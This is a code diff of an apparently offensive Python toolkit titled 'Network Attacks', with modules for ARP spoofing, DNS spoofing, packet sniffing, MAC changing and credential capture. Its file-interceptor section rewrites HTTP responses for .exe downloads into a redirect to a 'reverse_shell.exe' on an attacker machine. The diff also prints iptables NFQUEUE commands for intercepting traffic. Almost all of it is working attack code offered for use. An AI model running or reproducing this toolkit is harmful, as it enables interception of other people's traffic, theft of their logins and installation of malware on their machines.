@@ -1,8 +1,10 @@
+#!/usr/bin/env python3
 #For performing attack on local machine input and output chains to be used to create queue
 #"iptables -I INPUT -j NFQUEUE --queue-num 0" - INPUT CHAIN 
 #"iptables -I OUTPUT -j NFQUEUE --queue-num 0"- OUTPUT CHAIN
 # For performing attacks on remote machine forward chain to be used to create queue
 #"iptables -I FORWARD -j NFQUEUE --queue-num 0"- FORWARD CHAIN
+
 
 import scapy.all as scapy
 import time
@@ -13,42 +15,20 @@ from colorama import Fore, Style
 import argparse
 import optparse
 from scapy.layers import http
-import pyfiglet
 from arp_spoof import spoof, restore
 from network_scanner import scan, print_result
 from packet_sniffer import get_url, get_login_info
 from Mac_Changer import getmac, macchanger
 
-def manipulate_iptables(i):
-    """
-    MANIPULATING IPTABLES
-    """
-    # Manipulating iptables -------------------------------------------------------------------------
-    # Creating ip tables for intercepting QUEUE packets
-    try:
-        if i == 1:
-            # Run Attack locallly
-            os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
-            os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
-            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Iptables created successfully")
-        elif i == 2:
-            # Run Attack Remotely
-            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
-            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Iptables created successfully")
-        else:
-            print("Invalid selection. Please run script one more time")
-    except:
-        print('[*] Fail to create iptables')
-        print('[*] Exiting ...!')
-        exit(1)
-    # Manipulating iptables -------------------------------------------------------------------------
-#flushing iptables
-def flush_iptables():
-    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " \n[-] Detected CTRl + C...Restoring iptables...")
-    os.system("iptables --flush")
-    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Successfully restored iptables ")
-    print(Style.BRIGHT + Fore.RED + "[*]" + Fore.WHITE + Style.BRIGHT + " Exiting....")
-    exit(0)
+def cmd():
+    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.RED + Style.DIM + "For performing attack on local machine use the following commands")
+    print(Fore.CYAN + "-> iptables -I INPUT -j NFQUEUE --queue-num 0")
+    print(Fore.CYAN + "-> iptables -I OUTPUT -j NFQUEUE --queue-num 0")
+    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.RED + Style.DIM + "For performing attack on remote machine use the following commands")
+    print(Fore.CYAN + Style.BRIGHT + "-> iptables -I FORWARD -j NFQUEUE --queue-num 0")
+    print(Style.RESET_ALL)
+
+
 
 
 if __name__ == "__main__":
@@ -56,9 +36,9 @@ if __name__ == "__main__":
     HEADER
     """
     # Header Header header---------------------------------------------------------------------------
-    banner = pyfiglet.figlet_format("Network Attacks", font = "slant"  ) 
+    #banner = pyfiglet.figlet_format("Network Attacks", font = "slant"  ) 
     print(Fore.BLUE + Style.BRIGHT + """
-    
+
     // ░░░    ░░ ░░░░░░░ ░░░░░░░░ ░░     ░░  ░░░░░░  ░░░░░░  ░░   ░░      ░░░░░  ░░░░░░░░ ░░░░░░░░  ░░░░░   ░░░░░░ ░░   ░░ ░░░░░░░ 
     // ▒▒▒▒   ▒▒ ▒▒         ▒▒    ▒▒     ▒▒ ▒▒    ▒▒ ▒▒   ▒▒ ▒▒  ▒▒      ▒▒   ▒▒    ▒▒       ▒▒    ▒▒   ▒▒ ▒▒      ▒▒  ▒▒  ▒▒      
     // ▒▒ ▒▒  ▒▒ ▒▒▒▒▒      ▒▒    ▒▒  ▒  ▒▒ ▒▒    ▒▒ ▒▒▒▒▒▒  ▒▒▒▒▒       ▒▒▒▒▒▒▒    ▒▒       ▒▒    ▒▒▒▒▒▒▒ ▒▒      ▒▒▒▒▒   ▒▒▒▒▒▒▒ 
@@ -71,18 +51,18 @@ if __name__ == "__main__":
     """ + Fore.LIGHTWHITE_EX)
     # Header Header header---------------------------------------------------------------------------
     # print(banner) 
-    print("Welcome to Network Attacks in Local Area Network")
-    print("Please select from below options")
-    print("{0:<15} : {1:<15}".format("[+] ARP Spoofing","Press 1"))
+    print(Fore.CYAN + "Welcome to Network Attacks in Local Area Network")
+    print(Fore.CYAN + "Please select from below options")
+    print(Fore.MAGENTA + "{0:<15} : {1:<15}".format("[+] ARP Spoofing","Press 1"))
     print("{0:<15} : {1:<15}".format("[+] DNS Spoofing","Press 2"))
     print("{0:<15} : {1:<15}".format("[+] File interceptor","Press 3"))
     print("{0:<15} : {1:<15}".format("[+] Newtork scanner","Press 4"))
     print("{0:<15} : {1:<15}".format("[+] Packet sniffer","Press 5"))
     print("{0:<15} : {1:<15}".format("[+] Mac Changer","Press 6"))
-    # print("Enter Your Choice ---> ")
     n = int(input("Enter Your Choice ---> "))
 
-    #ARP Spoofing
+    #---------------------ARP Spoofing--------------------------
+
     if n == 1:
         def arpSpoof():
             target_ip = input("Enter the target ip to spoof ---> ")
@@ -102,14 +82,12 @@ if __name__ == "__main__":
                 restore(gateway_ip, target_ip)
         arpSpoof()
 
-    #DNS Spoofing
+    #---------------------DNS Spoofing-----------------------------
+    
     elif n == 2:
-        # parser=argparse.ArgumentParser()    
-        # parser.add_argument("-s","--spoof",dest="swebsite",help="Specify an website to spoof")  
-        # parser.add_argument("-r","--redirect",dest="dwebsite",help="Specify an website to redirect the user")
-        # options = parser.parse_args()
-        website = input("Please Enter website from which to redirect, \nLeave empty to redirect all traffic :")
-        redirect_ip = input("Please Enter IP to which redirect : ")
+        cmd()
+        website = input("[+] Please Enter website from which to redirect, \nLeave empty to redirect all traffic :")
+        redirect_ip = input("[+] Please Enter IP to which redirect : ")
 
         def process_packet(packet):
             scapy_packet = scapy.IP(packet.get_payload())
@@ -135,8 +113,11 @@ if __name__ == "__main__":
         queue.bind(0, process_packet)
         queue.run()
 
-    #----File Interceptor-----
+
+    #---------------------File Interceptor--------------------------
+
     elif n == 3:
+        cmd()
         ack_list = []
         def set_load(packet, load):
             #setting packet to 
@@ -146,52 +127,51 @@ if __name__ == "__main__":
             del packet[scapy.IP].chksum
             del packet[scapy.TCP].chksum
             return packet
+            
         def process_packet(packet):
+            # converting the packet into a scapy packet for modification
             scapy_packet = scapy.IP(packet.get_payload())
-            #if scapy_packet.haslayer(scapy.Raw):
-            if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
+            #print(scapy_packet)
+            if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+            # checking if the destination port is 80(default port for http) means that the packet is leaving from our computer and going to port 80
                 if scapy_packet[scapy.TCP].dport == 80:
-                    if ".exe" in scapy_packet[scapy.Raw].load:
+                # to check whether there is any exe file in the load field
+                    if ".exe" in scapy_packet[scapy.Raw].load.decode():
                         print ("[+] exe request")
                         ack_list.append(scapy_packet[scapy.TCP].ack)
-
-                elif scapy_packet[scapy.TCP].sport == 80:
-                    if scapy_packet[scapy.TCP].seq in ack_list:
-                        ack_list.remove(scapy_packet[scapy.TCP].seq)
-                        print ("[+] Replacing files")
-                        # redirecting request to my file location
-                        modified_packet = set_load(
-                            scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.44.141/evil-files/reverse_shell.exe\n\n")
-                        # sent the modified packet
-                        packet.set_payload(str(modified_packet))
-
+                
+            # checking if the source port is 80(default port for http) means this is a packet is leaving from port 80
+            elif scapy_packet[scapy.TCP].sport == 80:
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print ("[+] Replacing file")
+                    # redirecting request to my file location
+                    modified_packet = set_load(
+                        scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.44.128/evil-files/reverse_shell.exe\n\n")
+                    # sent the modified packet
+                    packet.set_payload(str(modified_packet).encode())
             packet.accept()
-            queue = netfilterqueue.NetfilterQueue()
-            queue.bind(0, process_packet)
-            queue.run()
-            # print("{0:<15} : {1:<15}".format("[+] Test the attack locally","Press 1"))
-            # print("{0:<15} : {1:<15}".format("[+] Test the attack remotely","Press 2"))
-            # m = int(input("Please Enter Your Choice --> "))
-            # manipulate_iptables(m)
-            # queue = netfilterqueue.NetfilterQueue()
-            # queue.bind(0, process_packet)
-            # try:
-            #     queue.run()
-            # except KeyboardInterrupt: # Avoiding keyboard interruption
-            #     flush_iptables()
+        
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, process_packet)
+        queue.run()
+        
 
-    #-----Network Scanner-------
+    #---------------------Network Scanner-------------------------
+    
     elif n == 4:
         #scan_result = scan("192.168.133.1/24")
         def networkScan():
             #options = get_arguments()
-            target = input("Enter Target-IP Range ---> ")
+            target = input("[+] Enter Target-IP Range ---> ")
             scan_result = scan(target)
             print_result(scan_result)
         networkScan()
 
-    #-----Packet Sniffer-----
+    #--------------------Packet Sniffer----------------------
+    
     elif n ==5:
+        cmd()
         def sniff(interface):
                 scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
         
@@ -203,34 +183,29 @@ if __name__ == "__main__":
                         print("[+] HTTP Request >>> " + format(url))
                         login_info = get_login_info(packet)
                         if login_info:
-                                print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")
-        try:
-            print("{0:<15} : {1:<15}".format("[+] Test the attack locally","Press 1"))
-            print("{0:<15} : {1:<15}".format("[+] Test the attack remotely","Press 2"))
-            m = int(input("Please Enter Your Choice --> "))
-            manipulate_iptables(m)                                
-            interface = input("Enter the interface on which you want to sniff traffic --->")	    
-            sniff(interface)
-        except KeyboardInterrupt: # Avoiding keyboard interruption
-            flush_iptables()
+                                print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")                                
+        interface = input("[+] Enter the interface on which you want to sniff traffic --->")	    
+        sniff(interface)
+        
         
 
 
-    #-----Mac Changer-----    
+    #----------------Mac Changer---------------------    
     elif n==6:
-        interface = input("Enter the interface to change the mac address ---> ")
-        new_mac = input("Enter the new MAC address ---> ")
+
+        interface = input("[+] Enter the interface to change the mac address ---> ")
+        new_mac = input("[+] Enter the new MAC address ---> ")
+        #function which change the mac address
         macchanger(interface,new_mac)
-        #main program which change the mac address
-
+        
+         #verify whether the mac is changed or Not
         final_mac = getmac(interface)
-        #verify whether the mac is changed or Not
-
-        if final_mac == new_mac :
+       
+        if final_mac == new_mac:
             print ("Mac Address Successfully Chaged with new one -> %r"%final_mac)
         else:
             print ("Error Occured Fix It !!!")
+    
     else:
         print("Invalid selection. Please run script one more time")
-
 
